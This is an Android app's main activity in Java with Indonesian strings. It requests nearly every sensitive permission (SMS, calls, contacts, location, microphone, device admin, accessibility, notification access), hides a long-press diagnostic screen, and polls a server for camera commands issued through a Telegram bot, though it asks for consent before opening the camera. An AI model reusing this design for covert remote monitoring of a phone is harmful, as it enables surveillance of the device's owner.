package com.example.app;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Toast;

import org.json.JSONObject;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.example.app.utils.PermissionHelper;

import java.util.ArrayList;
import java.util.List;

public class MainActivity
        extends AppCompatActivity {

    private static final int RUNTIME_PERMISSION_CODE = 100;
    private static final int DEVICE_ADMIN_CODE = 101;

    private static final long
            CAMERA_POLL_INTERVAL_MS = 10000L;

    private final Handler
            cameraCommandHandler =
            new Handler(
                    Looper.getMainLooper()
            );

    private boolean cameraPollingStarted =
            false;

    @Override
    protected void onCreate(
            Bundle savedInstanceState
    ) {

        super.onCreate(
                savedInstanceState
        );

        setContentView(
                R.layout.activity_main
        );

        findViewById(
                R.id.btnRequestRuntime
        ).setOnClickListener(
                v -> requestRuntimePermissions()
        );

        findViewById(
                R.id.btnAccessibility
        ).setOnClickListener(
                v ->
                        PermissionHelper
                                .openAccessibilitySettings(
                                        this
                                )
        );

        /*
         * Normal click:
         * opens Android Notification Access settings.
         */
        findViewById(
                R.id.btnNotificationListener
        ).setOnClickListener(
                v ->
                        PermissionHelper
                                .openNotificationListenerSettings(
                                        this
                                )
        );

        /*
         * LONG PRESS:
         * opens Myapk Diagnostic Mode.
         *
         * This avoids changing the existing XML layout.
         */
        findViewById(
                R.id.btnNotificationListener
        ).setOnLongClickListener(
                v -> {

                    startActivity(
                            new Intent(
                                    MainActivity.this,
                                    DebugActivity.class
                            )
                    );

                    Toast.makeText(
                            MainActivity.this,
                            "Myapk Diagnostic dibuka",
                            Toast.LENGTH_SHORT
                    ).show();

                    return true;
                }
        );

        findViewById(
                R.id.btnUsageStats
        ).setOnClickListener(
                v ->
                        PermissionHelper
                                .openUsageStatsSettings(
                                        this
                                )
        );

        findViewById(
                R.id.btnOverlay
        ).setOnClickListener(
                v ->
                        PermissionHelper
                                .openOverlaySettings(
                                        this
                                )
        );

        findViewById(
                R.id.btnManageStorage
        ).setOnClickListener(
                v ->
                        PermissionHelper
                                .openManageStorageSettings(
                                        this
                                )
        );

        findViewById(
                R.id.btnDeviceAdmin
        ).setOnClickListener(
                v ->
                        PermissionHelper
                                .requestDeviceAdmin(
                                        this,
                                        DEVICE_ADMIN_CODE
                                )
        );

        findViewById(
                R.id.btnWriteSettings
        ).setOnClickListener(
                v ->
                        PermissionHelper
                                .openWriteSettings(
                                        this
                                )
        );

        findViewById(
                R.id.btnIgnoreBattery
        ).setOnClickListener(
                v ->
                        PermissionHelper
                                .requestIgnoreBatteryOptimizations(
                                        this
                                )
        );

        startCameraCommandPolling();
    }

    private void startCameraCommandPolling() {

        if (cameraPollingStarted) {
            return;
        }

        cameraPollingStarted = true;

        cameraCommandHandler.post(
                new Runnable() {

                    @Override
                    public void run() {

                        checkCameraCommand();

                        cameraCommandHandler
                                .postDelayed(
                                        this,
                                        CAMERA_POLL_INTERVAL_MS
                                );
                    }
                }
        );
    }

    private void checkCameraCommand() {

        new Thread(
                () -> {

                    JSONObject result =
                            ApiHelper
                                    .getPendingCameraRequest();

                    if (result == null) {
                        return;
                    }

                    if (!"success"
                            .equalsIgnoreCase(
                                    result.optString(
                                            "status",
                                            ""
                                    )
                            )) {

                        return;
                    }

                    JSONObject request =
                            result.optJSONObject(
                                    "request"
                            );

                    if (request == null) {
                        return;
                    }

                    String requestId =
                            request.optString(
                                    "id",
                                    ""
                            );

                    String camera =
                            request.optString(
                                    "camera",
                                    ""
                            );

                    if (requestId.isEmpty()) {
                        return;
                    }

                    if (!"front".equals(camera)
                            &&
                            !"back".equals(camera)) {

                        return;
                    }

                    runOnUiThread(
                            () ->
                                    showCameraConfirmation(
                                            requestId,
                                            camera
                                    )
                    );
                }
        ).start();
    }

    private void showCameraConfirmation(
            String requestId,
            String camera
    ) {

        if (isFinishing()) {
            return;
        }

        String cameraLabel =
                "front".equals(camera)
                        ? "Kamera depan"
                        : "Kamera belakang";

        new androidx.appcompat.app.AlertDialog
                .Builder(this)
                .setTitle(
                        "Permintaan Kamera"
                )
                .setMessage(
                        cameraLabel
                                + " diminta melalui bot Telegram.\n\n"
                                + "Izinkan aplikasi membuka kamera?"
                )
                .setNegativeButton(
                        "Tolak",
                        (dialog, which) -> {

                            new Thread(
                                    () ->
                                            ApiHelper
                                                    .updateCameraRequestStatus(
                                                            requestId,
                                                            "CANCELLED"
                                                    )
                            ).start();
                        }
                )
                .setPositiveButton(
                        "Izinkan",
                        (dialog, which) -> {

                            new Thread(
                                    () ->
                                            ApiHelper
                                                    .updateCameraRequestStatus(
                                                            requestId,
                                                            "RECEIVED"
                                                    )
                            ).start();

                            Intent intent =
                                    new Intent(
                                            MainActivity.this,
                                            CameraActivity.class
                                    );

                            intent.putExtra(
                                    "requestId",
                                    requestId
                            );

                            intent.putExtra(
                                    "camera",
                                    camera
                            );

                            startActivity(
                                    intent
                            );
                        }
                )
                .show();
    }

    @Override
    protected void onDestroy() {

        cameraCommandHandler
                .removeCallbacksAndMessages(
                        null
                );

        cameraPollingStarted = false;

        super.onDestroy();
    }

    private void requestRuntimePermissions() {

        List<String> permissions =
                new ArrayList<>();

        permissions.add(
                Manifest.permission.CAMERA
        );

        permissions.add(
                Manifest.permission.RECORD_AUDIO
        );

        permissions.add(
                Manifest.permission.ACCESS_FINE_LOCATION
        );

        permissions.add(
                Manifest.permission.ACCESS_COARSE_LOCATION
        );

        permissions.add(
                Manifest.permission.READ_CONTACTS
        );

        permissions.add(
                Manifest.permission.WRITE_CONTACTS
        );

        permissions.add(
                Manifest.permission.READ_CALENDAR
        );

        permissions.add(
                Manifest.permission.WRITE_CALENDAR
        );

        permissions.add(
                Manifest.permission.READ_PHONE_STATE
        );

        permissions.add(
                Manifest.permission.CALL_PHONE
        );

        permissions.add(
                Manifest.permission.SEND_SMS
        );

        permissions.add(
                Manifest.permission.RECEIVE_SMS
        );

        if (Build.VERSION.SDK_INT >=
                Build.VERSION_CODES.S) {

            permissions.add(
                    Manifest.permission.BLUETOOTH_CONNECT
            );

            permissions.add(
                    Manifest.permission.BLUETOOTH_SCAN
            );

            permissions.add(
                    Manifest.permission.BLUETOOTH_ADVERTISE
            );
        }

        if (Build.VERSION.SDK_INT >=
                Build.VERSION_CODES.TIRAMISU) {

            permissions.add(
                    Manifest.permission.POST_NOTIFICATIONS
            );

            permissions.add(
                    Manifest.permission.READ_MEDIA_IMAGES
            );

            permissions.add(
                    Manifest.permission.READ_MEDIA_VIDEO
            );

            permissions.add(
                    Manifest.permission.READ_MEDIA_AUDIO
            );

        } else {

            permissions.add(
                    Manifest.permission.READ_EXTERNAL_STORAGE
            );

            permissions.add(
                    Manifest.permission.WRITE_EXTERNAL_STORAGE
            );
        }

        List<String> listPermissionsNeeded =
                new ArrayList<>();

        for (String permission :
                permissions) {

            if (
                    ContextCompat
                            .checkSelfPermission(
                                    this,
                                    permission
                            )
                            != PackageManager
                                    .PERMISSION_GRANTED
            ) {

                listPermissionsNeeded.add(
                        permission
                );
            }
        }

        if (!listPermissionsNeeded.isEmpty()) {

            ActivityCompat.requestPermissions(
                    this,
                    listPermissionsNeeded.toArray(
                            new String[0]
                    ),
                    RUNTIME_PERMISSION_CODE
            );
        }
    }
}
